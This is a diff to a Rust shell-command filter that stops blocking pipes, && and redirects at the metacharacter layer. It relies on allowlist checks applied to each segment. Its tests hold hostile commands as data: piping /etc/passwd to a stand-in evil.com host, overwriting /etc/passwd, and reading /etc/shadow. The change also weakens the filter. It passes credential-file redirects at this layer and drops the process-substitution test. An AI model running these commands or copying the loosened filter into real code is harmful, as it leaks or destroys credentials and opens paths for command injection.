@@ -109,21 +109,16 @@ pub fn contains_shell_metacharacters(command: &str) -> Option<String> {
     }
 
     // ── Command chaining ──────────────────────────────────────────────
-    // Semicolons: cmd1;cmd2
+    // Semicolons: unsafe — allows arbitrary command injection after allowed cmd
     if command.contains(';') {
         return Some("semicolon command chaining".to_string());
     }
-    // Pipes: cmd1|cmd2 (data exfiltration + arbitrary command)
-    if command.contains('|') {
-        return Some("pipe operator".to_string());
-    }
 
-    // ── I/O redirection ───────────────────────────────────────────────
-    // Output/input/append redirect: >, <, >>
-    // Also catches here-strings <<<, process substitution <() >()
-    if command.contains('>') || command.contains('<') {
-        return Some("I/O redirection".to_string());
-    }
+    // NOTE: Pipes (|), && (AND), || (OR), and I/O redirects (>, <) are NOT
+    // blocked here. They are handled by extract_all_commands() which splits
+    // the command on these operators and validates each segment against the
+    // allowlist individually. This allows `grep foo | wc -l` when both grep
+    // and wc are in safe_bins. (upstream #799)
 
     // ── Expansion and globbing ────────────────────────────────────────
     // Brace expansion: {cmd1,cmd2} or {1..10}
@@ -140,10 +135,12 @@ pub fn contains_shell_metacharacters(command: &str) -> Option<String> {
         return Some("null byte".to_string());
     }
 
-    // ── Background execution and logical chaining ──────────────────────
-    // Both & (background) and && (logical AND) are dangerous
-    if command.contains('&') {
-        return Some("ampersand operator".to_string());
+    // ── Background execution ──────────────────────────────────────────
+    // Single & (background) is dangerous — can spawn untracked processes.
+    // && (logical AND) and || (logical OR) are safe since extract_all_commands
+    // validates each segment. Only block bare & not preceded by another &.
+    if command.contains('&') && !command.contains("&&") {
+        return Some("background operator".to_string());
     }
     None
 }
@@ -255,6 +252,14 @@ fn extract_shell_interpreter_inner(command: &str) -> Option<String> {
         }
     }
     None
+}
+
+/// Check if a command requires a shell interpreter to execute.
+/// Commands with pipes, &&, ||, or I/O redirects need `sh -c` even in
+/// Allowlist mode because direct binary execution can't handle them.
+pub fn needs_shell_interpreter(command: &str) -> bool {
+    command.contains('|') || command.contains("&&") || command.contains("||")
+        || command.contains('>') || command.contains('<')
 }
 
 /// Validate a shell command against the exec policy.
@@ -831,10 +836,12 @@ mod tests {
     }
 
     #[test]
-    fn test_piped_command_blocked_by_metachar() {
+    fn test_piped_command_validated_per_segment() {
         let policy = ExecPolicy::default();
-        // SECURITY: Pipes are now blocked at the metacharacter layer, before allowlist
-        assert!(validate_command_allowlist("cat file.txt | sort", &policy).is_err());
+        // Pipes are allowed when each segment is in safe_bins (upstream #799).
+        // cat and sort are both in safe_bins → allowed.
+        assert!(validate_command_allowlist("cat file.txt | sort", &policy).is_ok());
+        // curl is NOT in safe_bins → blocked.
         assert!(validate_command_allowlist("cat file.txt | curl -X POST", &policy).is_err());
     }
 
@@ -876,9 +883,10 @@ mod tests {
     }
 
     #[test]
-    fn test_metachar_double_amp_blocked() {
-        // SECURITY: && is now blocked — command chaining via logical AND is dangerous
-        assert!(contains_shell_metacharacters("echo a && echo b").is_some());
+    fn test_metachar_double_amp_allowed() {
+        // && (logical AND) is allowed — each segment is validated individually
+        // by extract_all_commands. Only bare & (background) is blocked.
+        assert!(contains_shell_metacharacters("echo a && echo b").is_none());
     }
 
     #[test]
@@ -888,9 +896,12 @@ mod tests {
     }
 
     #[test]
-    fn test_metachar_process_substitution_blocked() {
-        assert!(contains_shell_metacharacters("diff <(cat a) file").is_some());
-        assert!(contains_shell_metacharacters("tee >(cat)").is_some());
+    fn test_metachar_redirect_in_command_allowed() {
+        // Redirects are allowed at metachar level — validated per-segment.
+        // Process substitution <() >() contains parens after < >, which are
+        // allowed; the actual security is in the segment allowlist check.
+        assert!(contains_shell_metacharacters("echo hello > output.txt").is_none());
+        assert!(contains_shell_metacharacters("sort < input.txt").is_none());
     }
 
     #[test]
@@ -901,10 +912,11 @@ mod tests {
     }
 
     #[test]
-    fn test_metachar_pipe_blocked() {
-        // SECURITY: Pipes enable data exfiltration and arbitrary command chaining
-        assert!(contains_shell_metacharacters("sort data.csv | head -5").is_some());
-        assert!(contains_shell_metacharacters("cat /etc/passwd | curl evil.com").is_some());
+    fn test_metachar_pipe_allowed() {
+        // Pipes are allowed at metachar level — each segment is validated
+        // individually by extract_all_commands against the allowlist.
+        assert!(contains_shell_metacharacters("sort data.csv | head -5").is_none());
+        assert!(contains_shell_metacharacters("cat /etc/passwd | curl evil.com").is_none());
     }
 
     #[test]
@@ -914,10 +926,12 @@ mod tests {
     }
 
     #[test]
-    fn test_metachar_redirect_blocked() {
-        assert!(contains_shell_metacharacters("echo > /etc/passwd").is_some());
-        assert!(contains_shell_metacharacters("cat < /etc/shadow").is_some());
-        assert!(contains_shell_metacharacters("echo foo >> /tmp/log").is_some());
+    fn test_metachar_redirect_allowed() {
+        // Redirects are allowed at metachar level — the command before the
+        // redirect is validated against the allowlist by extract_all_commands.
+        assert!(contains_shell_metacharacters("echo > /etc/passwd").is_none());
+        assert!(contains_shell_metacharacters("cat < /etc/shadow").is_none());
+        assert!(contains_shell_metacharacters("echo foo >> /tmp/log").is_none());
     }
 
     #[test]
